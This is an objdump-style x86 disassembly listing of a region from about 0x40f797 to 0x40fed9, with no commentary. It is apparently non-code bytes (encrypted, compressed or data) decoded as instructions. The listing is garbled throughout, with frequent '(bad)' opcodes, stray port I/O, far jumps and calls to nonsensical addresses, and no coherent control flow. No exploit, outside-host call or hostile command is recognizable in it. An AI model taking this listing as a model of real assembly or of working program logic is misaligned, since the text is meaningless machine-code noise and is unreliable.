  40f797:	test   BYTE PTR [ebx+0x4b],ah
  40f79a:	sbb    DWORD PTR [ebp-0xb96f5ab],edi
  40f7a0:	repnz xchg edi,eax
  40f7a2:	jns    0x40f80d
  40f7a4:	jbe    0x40f7db
  40f7a6:	mov    ecx,0x4290e698
  40f7ab:	movd   DWORD PTR [ebp+0x5c],mm0
  40f7af:	mov    eax,0x1215b7fd
  40f7b4:	xchg   ecx,eax
  40f7b5:	loopne 0x40f746
  40f7b7:	ds and al,0x6b
  40f7ba:	xor    DWORD PTR [ebp-0x72801b62],edx
  40f7c0:	dec    edi
  40f7c1:	lds    ebx,FWORD PTR [eax]
  40f7c3:	rol    edx,cl
  40f7c5:	push   cs
  40f7c6:	mov    ch,0x36
  40f7c8:	push   esp
  40f7c9:	retf   
  40f7ca:	xchg   ecx,eax
  40f7cb:	inc    ebx
  40f7cc:	and    al,0x63
  40f7ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7cf:	mov    al,ds:0x5e1a70e5
  40f7d4:	mov    ah,0x85
  40f7d6:	lock (bad) 
  40f7d8:	cmp    bl,BYTE PTR [edi]
  40f7da:	xor    al,0x8a
  40f7dc:	jle    0x40f7e6
  40f7de:	lods   eax,DWORD PTR ds:[esi]
  40f7df:	icebp  
  40f7e0:	mov    bh,0x32
  40f7e2:	fimul  DWORD PTR fs:[esi]
  40f7e5:	bound  esp,QWORD PTR [ebp+0x20231014]
  40f7eb:	mov    esi,0x8b2a30d1
  40f7f0:	mov    al,ds:0xe7742bd0
  40f7f5:	jno    0x40f812
  40f7f7:	pop    ebx
  40f7f8:	mov    edx,ds
  40f7fa:	icebp  
  40f7fb:	jl     0x40f795
  40f7fd:	push   ds
  40f7fe:	ja     0x40f7e4
  40f800:	(bad)
  40f803:	int3   
  40f804:	(bad)
  40f807:	pop    ebp
  40f808:	stc    
  40f809:	fistp  WORD PTR [ebx+0x22]
  40f80c:	hlt    
  40f80d:	pop    ecx
  40f80e:	lea    ebp,[edi]
  40f810:	in     eax,0x95
  40f812:	push   esi
  40f813:	addr16 inc ebx
  40f815:	jnp    0x40f85d
  40f817:	push   cs
  40f818:	jg     0x40f7e7
  40f81a:	call   0x31e51e89
  40f81f:	retw   
  40f821:	jge    0x40f7d6
  40f823:	inc    esp
  40f824:	push   edx
  40f825:	aaa    
  40f826:	jl     0x40f8a4
  40f828:	inc    ebx
  40f829:	pop    ss
  40f82a:	fistp  QWORD PTR [ecx+0x7f25f32b]
  40f830:	sbb    BYTE PTR [ecx],al
  40f832:	lea    ebx,[ebp+edx*4-0x1ff9e6e1]
  40f839:	(bad)  
  40f83a:	jl     0x40f820
  40f83c:	cmp    dh,ch
  40f83e:	in     eax,dx
  40f83f:	scas   al,BYTE PTR es:[edi]
  40f840:	mov    esp,DWORD PTR [edx+0x7d8e9a5e]
  40f846:	mov    ah,0x94
  40f848:	jne    0x40f872
  40f84a:	ins    BYTE PTR es:[edi],dx
  40f84b:	and    dh,BYTE PTR [edx-0x4f]
  40f84e:	push   ebp
  40f84f:	lods   al,BYTE PTR ds:[esi]
  40f850:	push   0x326e32c6
  40f855:	mov    ebx,0x3e183de6
  40f85a:	(bad)  
  40f85b:	fldenv [ebx]
  40f85d:	ja     0x40f884
  40f85f:	dec    esi
  40f860:	hlt    
  40f861:	inc    edx
  40f862:	in     eax,0x66
  40f864:	and    BYTE PTR [ecx],dh
  40f866:	xchg   ebx,eax
  40f867:	xor    edi,eax
  40f869:	add    eax,0x368197b6
  40f86e:	xchg   esp,eax
  40f86f:	xchg   ebx,eax
  40f870:	xchg   ebp,eax
  40f871:	es sahf 
  40f873:	mov    DWORD PTR [ebx-0x27312e30],esp
  40f879:	fisttp DWORD PTR ds:0xfb19b67a
  40f87f:	inc    ecx
  40f880:	(bad)
  40f884:	fisubr DWORD PTR ds:0x97f5b88d
  40f88a:	mov    esp,ebp
  40f88c:	ficom  DWORD PTR [ebp-0x13]
  40f88f:	xor    ch,al
  40f891:	and    DWORD PTR [ebp-0x29],ebp
  40f894:	mov    al,0x2d
  40f896:	mov    eax,0xa3ee8c
  40f89b:	test   al,0xb
  40f89d:	jge    0x40f89e
  40f89f:	mov    ds:0x9f0b7d04,al
  40f8a4:	sub    DWORD PTR [edi+0x151515ba],edi
  40f8aa:	cmp    bh,BYTE PTR [ebx+ecx*2]
  40f8ad:	sti    
  40f8ae:	fnstenv [eax+0x5474c22c]
  40f8b4:	leave  
  40f8b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8b6:	dec    edi
  40f8b7:	retf   
  40f8b8:	jmp    0x399d8d58
  40f8bd:	mov    dh,0x91
  40f8bf:	inc    edx
  40f8c0:	and    bl,BYTE PTR [edi]
  40f8c2:	push   edi
  40f8c3:	out    dx,eax
  40f8c4:	fidivr WORD PTR [ebx]
  40f8c6:	in     eax,0x1
  40f8c8:	mov    eax,0x4d282d72
  40f8cd:	adc    eax,0x19017b7c
  40f8d2:	and    DWORD PTR [edx],edx
  40f8d4:	jne    0x40f8d2
  40f8d6:	add    al,0x35
  40f8d8:	not    BYTE PTR [ecx]
  40f8da:	stc    
  40f8db:	repnz mov es,WORD PTR [ebp+esi*8-0x48]
  40f8e0:	add    BYTE PTR [ebp-0x2cdecce0],dh
  40f8e6:	retf   0x5894
  40f8e9:	xchg   esi,eax
  40f8ea:	ja     0x40f928
  40f8ec:	in     eax,0xaf
  40f8ee:	js     0x40f8db
  40f8f0:	xchg   ebp,eax
  40f8f1:	mov    ds:0xdf22f9fb,eax
  40f8f6:	xor    eax,0xd507e446
  40f8fb:	ins    DWORD PTR es:[edi],dx
  40f8fc:	adc    eax,0xec6fc406
  40f901:	and    al,0x91
  40f903:	ret    
  40f904:	(bad)  
  40f905:	sar    eax,1
  40f907:	sbb    DWORD PTR [ecx+eax*2+0x2f],edi
  40f90b:	outs   dx,DWORD PTR ds:[esi]
  40f90c:	mov    si,WORD PTR [edi-0x56c37aac]
  40f913:	xor    ebp,DWORD PTR [edx]
  40f915:	inc    ebp
  40f916:	mov    al,0x63
  40f918:	dec    ecx
  40f919:	mov    ebx,0x7b2db952
  40f91e:	sub    eax,0x4f41a834
  40f923:	(bad)  
  40f924:	xchg   edx,eax
  40f925:	sti    
  40f926:	(bad)  
  40f928:	sahf   
  40f929:	adc    BYTE PTR [esi-0x56],bl
  40f92c:	jle    0x40f9aa
  40f92e:	sar    ebp,cl
  40f930:	dec    eax
  40f931:	sub    edi,esp
  40f933:	fisubr WORD PTR [eax]
  40f935:	lock xchg esi,eax
  40f937:	jbe    0x40f99c
  40f939:	lea    eax,ds:0x92699e03
  40f93f:	cmp    BYTE PTR [edx],dh
  40f941:	sbb    esp,ecx
  40f943:	ret    
  40f944:	mov    ecx,esi
  40f946:	(bad)  
  40f947:	xor    dl,BYTE PTR [eax+0xd]
  40f94a:	enter  0xfba6,0x74
  40f94e:	mov    esp,0xa0ca50f5
  40f953:	fs pop ecx
  40f955:	sub    bl,BYTE PTR [edx]
  40f957:	test   BYTE PTR [edi-0x7d3968f],cl
  40f95d:	cdq    
  40f95e:	cdq    
  40f95f:	bound  ecx,QWORD PTR [esi-0x1e]
  40f962:	or     DWORD PTR [ecx+0x45715028],0x9a97f900
  40f96c:	rcl    DWORD PTR [ebx-0x17],1
  40f96f:	sar    DWORD PTR [ecx],0xf9
  40f972:	add    dl,BYTE PTR [edx-0x51]
  40f975:	pop    esi
  40f976:	aad    0x7b
  40f978:	shr    DWORD PTR [edx+0x7d93edde],cl
  40f97e:	in     eax,dx
  40f97f:	pop    edi
  40f980:	dec    edx
  40f981:	mov    ah,0x2e
  40f983:	jmp    0x8542:0x6507b4b0
  40f98a:	xor    DWORD PTR [eax],eax
  40f98c:	dec    edx
  40f98d:	xchg   esi,eax
  40f98e:	test   DWORD PTR [ebx+0x12],ebp
  40f991:	stos   DWORD PTR es:[edi],eax
  40f992:	mov    al,0x85
  40f994:	inc    esi
  40f995:	pop    es
  40f996:	sbb    al,dl
  40f998:	push   esi
  40f999:	and    eax,0xe6ecb7bf
  40f99e:	sbb    ebp,DWORD PTR [ebp+0x5c]
  40f9a1:	dec    eax
  40f9a2:	xor    DWORD PTR [ebp+0x2dbf3fd8],edx
  40f9a8:	(bad)  
  40f9a9:	out    0x24,eax
  40f9ab:	out    0x26,al
  40f9ad:	xor    ebx,DWORD PTR [esi+0x18743395]
  40f9b3:	cmp    bh,cl
  40f9b5:	rol    BYTE PTR [edi],cl
  40f9b7:	mov    dl,0xb2
  40f9b9:	shl    BYTE PTR [ecx+0x2b],0x4c
  40f9bd:	push   cs
  40f9be:	lods   al,BYTE PTR ds:[esi]
  40f9bf:	loopne 0x40fa12
  40f9c1:	pop    ecx
  40f9c2:	ja     0x40f9c3
  40f9c4:	rol    dh,1
  40f9c6:	sub    dh,cl
  40f9c8:	icebp  
  40f9c9:	push   es
  40f9ca:	inc    ecx
  40f9cb:	loope  0x40f9bb
  40f9cd:	xchg   ebx,eax
  40f9ce:	xchg   edi,eax
  40f9cf:	and    al,0x89
  40f9d1:	adc    ebp,ebp
  40f9d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9d4:	mov    dl,0x5f
  40f9d6:	jnp    0x40fa36
  40f9d8:	icebp  
  40f9d9:	mov    dl,0x5d
  40f9db:	mov    WORD PTR [ebp+0x3bdd2f01],gs
  40f9e1:	cmp    edx,esi
  40f9e3:	test   eax,0xd0070b50
  40f9e8:	jnp    0x40fa12
  40f9ea:	fs enter 0x2028,0xc5
  40f9ef:	xchg   edi,eax
  40f9f0:	pop    ebp
  40f9f1:	or     esi,DWORD PTR [ebx]
  40f9f3:	jmp    0xdb1f:0x4f7a95d9
  40f9fa:	sbb    bh,BYTE PTR [ecx+eax*2+0x4c57153c]
  40fa01:	inc    ebx
  40fa02:	imul   eax,DWORD PTR [esi+0x6],0x4
  40fa06:	(bad)  
  40fa07:	ja     0x40f9ae
  40fa09:	dec    ecx
  40fa0a:	lods   eax,DWORD PTR ds:[esi]
  40fa0b:	pop    es
  40fa0c:	mov    bh,0xc
  40fa0e:	call   0x1ddf694f
  40fa13:	fisubr WORD PTR [ecx+0x7c97921d]
  40fa19:	mov    bl,0x3f
  40fa1b:	push   edx
  40fa1d:	and    eax,0x8fc2521a
  40fa22:	stc    
  40fa23:	mov    ch,0xe5
  40fa25:	xchg   BYTE PTR [ebx],ch
  40fa27:	mov    ds:0xe436620f,eax
  40fa2c:	cwde   
  40fa2d:	ds aas 
  40fa2f:	fdiv   QWORD PTR [eax+0x6a]
  40fa32:	sub    DWORD PTR [ebp-0x44],eax
  40fa35:	aad    0xd4
  40fa37:	cmp    dl,BYTE PTR [ebp-0x1]
  40fa3a:	sbb    bl,BYTE PTR [ecx+0xfd7f9fe]
  40fa40:	or     DWORD PTR [ecx-0x22c69407],esp
  40fa46:	pop    ebx
  40fa47:	gs hlt 
  40fa49:	ins    DWORD PTR es:[edi],dx
  40fa4a:	jb     0x40fa18
  40fa4c:	aam    0xb0
  40fa4e:	push   ecx
  40fa4f:	addr16 mov eax,0x79989a86
  40fa55:	push   cs
  40fa56:	and    eax,0xc8639004
  40fa5b:	add    DWORD PTR [eax-0x68a5816f],ebp
  40fa61:	test   eax,0x899880fc
  40fa66:	stos   DWORD PTR es:[edi],eax
  40fa67:	mov    ebx,0xf1c6567
  40fa6c:	imul   esi,DWORD PTR [esi],0x2fa05424
  40fa72:	imul   edi,DWORD PTR [ecx],0x71d93c9e
  40fa78:	in     eax,0x2d
  40fa7a:	fs retf 0xd3f0
  40fa7e:	retf   0xb462
  40fa81:	lahf   
  40fa82:	jo     0x40fac4
  40fa84:	iret   
  40fa85:	pop    esp
  40fa86:	sub    DWORD PTR [edx-0x2dff8116],0xffffff93
  40fa8d:	jno    0x40fa40
  40fa8f:	sub    DWORD PTR [edx+0x57315e5a],ecx
  40fa95:	and    esp,DWORD PTR [edx+0x0]
  40fa98:	popf   
  40fa99:	aad    0x71
  40fa9b:	xchg   ecx,eax
  40fa9c:	test   DWORD PTR [ebx],esi
  40fa9e:	mov    WORD PTR [eax-0x40],es
  40faa1:	and    eax,0x809da19a
  40faa6:	fs ret 
  40faa8:	cmp    bh,BYTE PTR [esp+ebp*2-0x118abfdf]
  40faaf:	inc    edi
  40fab0:	out    dx,al
  40fab1:	pop    es
  40fab2:	or     eax,ebp
  40fab4:	aas    
  40fab5:	xchg   edx,eax
  40fab6:	fs je  0x40fb15
  40fab9:	or     bh,cl
  40fabb:	dec    edi
  40fabc:	daa    
  40fabd:	mov    edx,0xf9b89768
  40fac2:	push   esi
  40fac3:	inc    edi
  40fac4:	jmp    0xba83:0x5ad2c5aa
  40facb:	shl    BYTE PTR [eax],0x5b
  40face:	pop    edx
  40facf:	outs   dx,DWORD PTR ds:[esi]
  40fad0:	xlat   BYTE PTR ds:[ebx]
  40fad1:	in     eax,0x48
  40fad3:	aaa    
  40fad4:	lods   eax,DWORD PTR ds:[esi]
  40fad5:	add    DWORD PTR [edi],eax
  40fad7:	mov    ch,0x93
  40fad9:	test   edi,ecx
  40fadb:	add    al,0xf2
  40fadd:	and    bl,BYTE PTR [edi+0x2e]
  40fae0:	repnz shl edx,1
  40fae3:	cli    
  40fae4:	cs push esi
  40fae6:	add    DWORD PTR [eax-0x3bbde27e],0xfffffff0
  40faed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40faee:	repz xor BYTE PTR [ecx-0x5c01311f],ch
  40faf5:	cmc    
  40faf6:	lds    ebp,FWORD PTR [edi-0x5b]
  40faf9:	popf   
  40fafa:	mov    al,0x4d
  40fafc:	pop    edi
  40fafd:	pop    eax
  40fafe:	int    0x3
  40fb00:	jle    0x40fb6e
  40fb02:	adc    dh,BYTE PTR [esi-0x6a]
  40fb05:	test   al,0x45
  40fb07:	sbb    bh,ah
  40fb09:	xlat   BYTE PTR ds:[ebx]
  40fb0a:	xor    eax,0xdcf9bf68
  40fb0f:	call   0x8ca5a56e
  40fb14:	mov    ecx,0x3170669a
  40fb19:	adc    BYTE PTR [edi],cl
  40fb1b:	mov    al,0xaa
  40fb1d:	aaa    
  40fb1e:	dec    ebx
  40fb1f:	mov    dh,0x72
  40fb21:	(bad)  
  40fb22:	mov    eax,0xfeb8df01
  40fb27:	sbb    eax,0x6a2f88c
  40fb2c:	imul   esi,DWORD PTR [ecx],0x65
  40fb2f:	push   edx
  40fb30:	add    edi,DWORD PTR [esi+0x4e0b21a9]
  40fb36:	iret   
  40fb37:	sbb    DWORD PTR [esp+esi*4+0x61],edi
  40fb3b:	jae    0x40fb78
  40fb3d:	das    
  40fb3e:	inc    esp
  40fb3f:	push   edx
  40fb40:	push   ss
  40fb41:	sahf   
  40fb42:	test   BYTE PTR [ebp+0x25],0xb7
  40fb46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb47:	bts    DWORD PTR [ebp-0x701f0e9a],esi
  40fb4e:	adc    dl,BYTE PTR [ebp+0x772f7df2]
  40fb54:	inc    ebp
  40fb55:	and    BYTE PTR [ecx+0x278be9d6],bl
  40fb5b:	sub    BYTE PTR [esi-0x6b],ch
  40fb5e:	inc    esp
  40fb5f:	dec    eax
  40fb60:	jge    0x40fb32
  40fb62:	clc    
  40fb63:	cmc    
  40fb64:	imul   edx,DWORD PTR [esp+eiz*4],0x8e8cca80
  40fb6b:	xchg   BYTE PTR [ebx],cl
  40fb6d:	in     eax,dx
  40fb6e:	jnp    0x40fb18
  40fb70:	adc    al,0x96
  40fb72:	and    ebp,edx
  40fb74:	js     0x40fb9d
  40fb76:	mov    bl,0xa9
  40fb78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb79:	mov    edx,DWORD PTR [ebx]
  40fb7b:	les    ebp,FWORD PTR [esi-0x626205e0]
  40fb81:	pop    esp
  40fb82:	stos   DWORD PTR es:[edi],eax
  40fb83:	inc    esp
  40fb84:	or     edi,DWORD PTR [ecx]
  40fb86:	ror    DWORD PTR [ebx+0x183f1af6],0x99
  40fb8d:	stos   BYTE PTR es:[edi],al
  40fb8e:	das    
  40fb8f:	cmp    eax,0xda550e76
  40fb94:	(bad)  
  40fb95:	idiv   DWORD PTR [ecx+eax*8]
  40fb98:	fadd   QWORD PTR [ebx]
  40fb9a:	sbb    eax,0xa00e8d2
  40fb9f:	push   ebp
  40fba0:	cmp    esi,DWORD PTR [edx+0x7c13eaac]
  40fba6:	pop    es
  40fba7:	leave  
  40fba8:	inc    esi
  40fba9:	cs scas eax,DWORD PTR es:[edi]
  40fbab:	out    dx,al
  40fbac:	leave  
  40fbad:	push   es
  40fbae:	xchg   ebp,eax
  40fbaf:	cdq    
  40fbb0:	push   edx
  40fbb1:	cwde   
  40fbb2:	cmp    ecx,DWORD PTR [ebp+0x4a]
  40fbb5:	xchg   DWORD PTR [edi+ebp*1],esp
  40fbb8:	jns    0x40fb5a
  40fbba:	inc    ebx
  40fbbb:	xchg   ebx,eax
  40fbbc:	mov    ah,0x8
  40fbbe:	xchg   edi,eax
  40fbbf:	fcomp  QWORD PTR [esi]
  40fbc1:	jge    0x40fbaf
  40fbc3:	(bad)  
  40fbc4:	mov    ebp,0xc980479f
  40fbc9:	jg     0x40fb69
  40fbcb:	push   cs
  40fbcc:	repz sub ebp,DWORD PTR [eax-0x23bee19f]
  40fbd3:	xor    al,0x50
  40fbd5:	lock mov al,ds:0x4d84f1e2
  40fbdb:	(bad)  
  40fbdc:	leave  
  40fbdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbde:	loop   0x40fb99
  40fbe0:	pusha  
  40fbe1:	mov    cl,dl
  40fbe3:	rcr    BYTE PTR [ebp+0x5c25c9f9],0x8
  40fbea:	and    cl,BYTE PTR [esi+0x7aed872e]
  40fbf0:	jmp    0x45ac32f
  40fbf5:	pop    eax
  40fbf6:	pop    ss
  40fbf7:	scas   eax,DWORD PTR es:[edi]
  40fbf8:	sbb    DWORD PTR [ecx],ebx
  40fbfa:	mov    al,0xcc
  40fbfc:	aas    
  40fbfd:	lock les edx,FWORD PTR [ebx]
  40fc00:	call   0xa5cd2ce5
  40fc05:	mov    al,0x17
  40fc07:	sub    eax,0xa9b9ebfe
  40fc0c:	shr    edi,0x19
  40fc0f:	mov    ecx,0xe3fb59d2
  40fc14:	(bad)  
  40fc15:	ret    
  40fc16:	cwde   
  40fc17:	out    0x81,al
  40fc19:	xchg   bh,al
  40fc1b:	cmp    dl,cl
  40fc1d:	clc    
  40fc1e:	jno    0x40fc14
  40fc20:	out    0x3f,eax
  40fc22:	mov    ch,0x15
  40fc24:	(bad)  
  40fc26:	sbb    DWORD PTR [esi-0x78],edi
  40fc29:	call   0x89763cfe
  40fc2e:	jge    0x40fc63
  40fc30:	test   al,0x2d
  40fc32:	lahf   
  40fc33:	mov    eax,ds:0x8f6a483b
  40fc38:	call   0xba2dcb58
  40fc3d:	inc    esi
  40fc3e:	pop    edx
  40fc3f:	lea    eax,[edx-0x42f379e]
  40fc45:	rol    ebx,0x2a
  40fc48:	jle    0x40fc51
  40fc4a:	les    eax,FWORD PTR [esi+edi*1-0x5f2328f1]
  40fc51:	inc    edx
  40fc52:	cs fwait
  40fc54:	push   ds
  40fc55:	loopne 0x40fcad
  40fc57:	gs jno 0x40fc8b
  40fc5a:	adc    al,0xea
  40fc5c:	rcl    ch,0x72
  40fc5f:	rcl    BYTE PTR [eax],0x7a
  40fc62:	mov    eax,ds:0x9f0b490e
  40fc67:	mov    cl,0x2c
  40fc69:	dec    esp
  40fc6a:	lods   al,BYTE PTR ds:[esi]
  40fc6b:	jecxz  0x40fc67
  40fc6d:	jbe    0x40fc28
  40fc6f:	in     al,0x43
  40fc71:	xchg   edx,eax
  40fc72:	sahf   
  40fc73:	in     al,dx
  40fc74:	out    dx,al
  40fc75:	stos   WORD PTR es:[edi],ax
  40fc77:	fnstcw WORD PTR [eax-0x4a]
  40fc7a:	xlat   BYTE PTR ds:[ebx]
  40fc7b:	push   ss
  40fc7c:	and    al,0x2b
  40fc7e:	jmp    0x94d:0xc7d8ad8a
  40fc85:	aaa    
  40fc86:	in     al,dx
  40fc87:	xlat   BYTE PTR ds:[ebx]
  40fc88:	mov    dh,0x1e
  40fc8a:	imul   ebx,DWORD PTR [edi],0x510f8b9d
  40fc90:	cld    
  40fc91:	add    BYTE PTR [edx],bl
  40fc93:	les    ecx,FWORD PTR [eax]
  40fc95:	mov    esp,0xd32a4c00
  40fc9a:	mov    es,WORD PTR [eax]
  40fc9c:	adc    eax,0x88955554
  40fca1:	push   ebx
  40fca2:	ret    
  40fca3:	sbb    DWORD PTR [ebx-0x6d],eax
  40fca6:	loope  0x40fcf9
  40fca8:	mov    ebx,DWORD PTR [ebx-0x14]
  40fcab:	popa   
  40fcac:	mov    WORD PTR [eax+0x7e],ss
  40fcaf:	(bad)  
  40fcb0:	mov    ds:0x72145578,al
  40fcb5:	mov    ebx,0xf63d698f
  40fcba:	(bad)  
  40fcbb:	jnp    0x40fc7b
  40fcbd:	mov    DWORD PTR [edx-0x40],esi
  40fcc0:	xchg   ebp,eax
  40fcc1:	sbb    eax,0x73ae6ff1
  40fcc6:	nop
  40fcc7:	movups xmm6,XMMWORD PTR [esp+ecx*1-0x37]
  40fccc:	lock not BYTE PTR [esi+0x6c]
  40fcd0:	jp     0x40fcf6
  40fcd2:	mov    ah,0xea
  40fcd4:	in     al,0xb9
  40fcd6:	mov    ch,0xa3
  40fcd8:	sub    ecx,esi
  40fcda:	lock test eax,0x3dede688
  40fce0:	push   0x59
  40fce2:	shl    BYTE PTR [ebp+0x85d552d],0xb3
  40fce9:	or     al,0x55
  40fceb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcec:	or     DWORD PTR [esi+0x20],edx
  40fcef:	jae    0x40fc90
  40fcf1:	sbb    edx,DWORD PTR [eax+0x2c8abc8e]
  40fcf7:	add    al,0x12
  40fcf9:	or     DWORD PTR [ebp-0x16],0xffffffba
  40fcfd:	pop    es
  40fcfe:	scas   eax,DWORD PTR es:[edi]
  40fcff:	jne    0x40fd60
  40fd01:	pop    es
  40fd02:	das    
  40fd03:	or     ah,BYTE PTR [esi]
  40fd05:	mov    ah,0x90
  40fd07:	hlt    
  40fd08:	and    BYTE PTR [ebp-0x60],al
  40fd0b:	push   0xfffffff8
  40fd0d:	je     0x40fd64
  40fd0f:	xor    edx,DWORD PTR [ebp-0xd1deed6]
  40fd15:	mov    ah,0x18
  40fd17:	or     ah,BYTE PTR [ebx+0x1b7166f3]
  40fd1d:	dec    edi
  40fd1e:	lods   eax,DWORD PTR ds:[esi]
  40fd1f:	popa   
  40fd20:	loop   0x40fd4e
  40fd22:	xchg   ebx,eax
  40fd23:	xchg   ebx,eax
  40fd24:	dec    esp
  40fd25:	cmp    dl,al
  40fd27:	std    
  40fd28:	lods   eax,DWORD PTR ds:[esi]
  40fd29:	into   
  40fd2a:	add    dl,al
  40fd2c:	fdivr  QWORD PTR [eax-0x5d]
  40fd2f:	in     eax,0x69
  40fd31:	mov    ds:0xa5cecd8c,eax
  40fd36:	mov    DWORD PTR [ebp+0x27eac216],eax
  40fd3c:	pop    ebp
  40fd3d:	jnp    0x40fd9e
  40fd3f:	adc    al,cl
  40fd41:	pushf  
  40fd42:	test   bl,bh
  40fd44:	cmp    BYTE PTR cs:[esi+0x33b86050],dl
  40fd4b:	mov    edi,0x613f2dfa
  40fd50:	stos   BYTE PTR es:[edi],al
  40fd51:	iret   
  40fd52:	cmp    BYTE PTR [ebp-0x24],ah
  40fd55:	cld    
  40fd56:	(bad)  
  40fd57:	repz jns 0x40fd9a
  40fd5a:	adc    edi,DWORD PTR [ebp+0x68]
  40fd5d:	test   eax,0x12c5818e
  40fd62:	push   ss
  40fd63:	jns    0x40fd26
  40fd65:	xchg   ecx,eax
  40fd66:	adc    BYTE PTR [eax-0x51],ah
  40fd69:	imul   edi,DWORD PTR [eax+0x1d9c6644],0x76
  40fd70:	sub    eax,0x6157fc15
  40fd75:	aas    
  40fd76:	mov    bh,0xb1
  40fd78:	pop    esp
  40fd79:	das    
  40fd7a:	in     al,0x6
  40fd7c:	out    0xe4,eax
  40fd7e:	cmp    eax,0x4414ef14
  40fd83:	into   
  40fd84:	mov    cl,ah
  40fd86:	jno    0x40fdbf
  40fd88:	push   edx
  40fd89:	mov    dh,0xea
  40fd8b:	std    
  40fd8c:	mov    BYTE PTR [eax+0x2492baed],0x1e
  40fd93:	out    dx,eax
  40fd94:	outs   dx,BYTE PTR ds:[esi]
  40fd95:	cli    
  40fd96:	gs xor eax,0xc264e96b
  40fd9c:	dec    edi
  40fd9d:	hlt    
  40fd9e:	mov    edx,0xce41c53b
  40fda3:	sahf   
  40fda4:	sub    ebx,ebp
  40fda6:	fsubr  DWORD PTR [ebx+0x74]
  40fda9:	add    bl,BYTE PTR [ecx-0x29]
  40fdac:	lahf   
  40fdad:	xchg   ecx,eax
  40fdae:	cld    
  40fdaf:	mov    ebx,0x88f37efd
  40fdb4:	pop    esp
  40fdb5:	push   ebp
  40fdb6:	dec    ebp
  40fdb7:	adc    bl,BYTE PTR [esi]
  40fdb9:	mov    ds:0x9bd70276,eax
  40fdbe:	lods   al,BYTE PTR ds:[esi]
  40fdbf:	lahf   
  40fdc0:	mov    ecx,0x15c6e459
  40fdc5:	jmp    0x262a:0x220faab8
  40fdcc:	std    
  40fdcd:	mov    ds:0xf10a773a,al
  40fdd2:	outs   dx,BYTE PTR ds:[esi]
  40fdd3:	shr    BYTE PTR [edx],1
  40fdd5:	mov    DWORD PTR [ebx],eax
  40fdd7:	sahf   
  40fdd8:	add    al,0xcc
  40fdda:	retf   0x2066
  40fddd:	adc    al,0x66
  40fddf:	sub    ah,al
  40fde1:	ror    ch,0x2d
  40fde4:	inc    ecx
  40fde5:	or     al,0x77
  40fde7:	call   0xb7a418e4
  40fdec:	data16 loope 0x40fe5e
  40fdef:	mov    ebx,esi
  40fdf1:	popf   
  40fdf2:	mov    eax,0x6ddd3b5e
  40fdf7:	pusha  
  40fdf8:	xor    al,0x5
  40fdfa:	inc    ebx
  40fdfb:	(bad)
  40fdfe:	lahf   
  40fdff:	jns    0x40fe1a
  40fe01:	inc    edx
  40fe02:	jmp    0x40fdf7
  40fe04:	jmp    0x40fdd4
  40fe06:	mov    BYTE PTR [edi-0x68a5c5d4],ah
  40fe0c:	pop    edi
  40fe0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe0e:	nop
  40fe0f:	popa   
  40fe10:	jmp    0x387bc8f4
  40fe15:	lods   al,BYTE PTR ds:[esi]
  40fe16:	ret    
  40fe17:	inc    ecx
  40fe18:	mov    DWORD PTR [esi+0x12ae29b0],edx
  40fe1e:	push   ds
  40fe1f:	int3   
  40fe20:	arpl   WORD PTR [edx],ax
  40fe22:	int3   
  40fe23:	sub    DWORD PTR [edx],edi
  40fe25:	sar    dl,1
  40fe27:	shl    ah,0xcc
  40fe2a:	aad    0xb7
  40fe2c:	inc    esi
  40fe2d:	mov    edx,0xe4d2bf47
  40fe32:	scas   al,BYTE PTR es:[edi]
  40fe33:	(bad)  
  40fe34:	dec    eax
  40fe35:	test   al,0x44
  40fe37:	mov    ah,0x8e
  40fe39:	mov    al,ds:0x74e5845e
  40fe3e:	popa   
  40fe3f:	std    
  40fe40:	pop    eax
  40fe41:	repnz ficomp WORD PTR [edi-0x1e]
  40fe45:	or     eax,0x90c0eb1a
  40fe4a:	and    dl,BYTE PTR [eax+0x7e]
  40fe4d:	ret    0xdb43
  40fe50:	and    eax,0xd42bf658
  40fe55:	lea    ebx,[ebx]
  40fe57:	jnp    0x40fec5
  40fe59:	xchg   esi,eax
  40fe5a:	push   esi
  40fe5b:	xor    ebp,DWORD PTR [edi]
  40fe5d:	loopne 0x40feb0
  40fe5f:	inc    edx
  40fe60:	push   esi
  40fe61:	popa   
  40fe62:	adc    esi,esp
  40fe64:	jb     0x40feae
  40fe66:	icebp  
  40fe67:	into   
  40fe68:	lsl    ecx,dx
  40fe6b:	(bad)  
  40fe6c:	fisttp DWORD PTR ds:0x232d3c93
  40fe72:	jo     0x40fea3
  40fe74:	aaa    
  40fe75:	scas   eax,DWORD PTR es:[edi]
  40fe76:	ret    
  40fe77:	pop    esi
  40fe78:	fld    DWORD PTR ds:0x907b918d
  40fe7e:	fisubr DWORD PTR [esp+edi*1]
  40fe81:	call   0xbd7557a8
  40fe86:	aas    
  40fe87:	adc    bh,dl
  40fe89:	ret    0xbe44
  40fe8c:	inc    edx
  40fe8d:	pop    es
  40fe8e:	xchg   ebp,eax
  40fe8f:	inc    DWORD PTR [edi]
  40fe91:	icebp  
  40fe92:	add    al,0x20
  40fe94:	sbb    eax,0xe20eb166
  40fe99:	cmc    
  40fe9a:	aad    0x7d
  40fe9c:	add    eax,0x3f49b20d
  40fea1:	ins    BYTE PTR es:[edi],dx
  40fea2:	jbe    0x40fe40
  40fea4:	les    ebp,FWORD PTR [esi]
  40fea6:	mov    BYTE PTR [edi-0x45300f84],cl
  40feac:	stos   BYTE PTR es:[edi],al
  40fead:	xchg   BYTE PTR [eax+0x594adb43],ch
  40feb3:	add    BYTE PTR [esi],bl
  40feb5:	sbb    ch,0x3f
  40feb8:	cli    
  40feb9:	enter  0x5c2d,0xdc
  40febd:	ja     0x40fec5
  40febf:	repnz adc DWORD PTR ds:0xd01efd3c,eax
  40fec6:	mov    esi,0x8091e852
  40fecb:	inc    BYTE PTR [esi]
  40fecd:	add    BYTE PTR [ecx],dh
  40fecf:	pop    edi
  40fed0:	cmp    ebx,DWORD PTR [esi+edx*2-0x37ddf197]
  40fed7:	ins    DWORD PTR es:[edi],dx
  40fed8:	dec    eax
  40fed9:	push   ebp
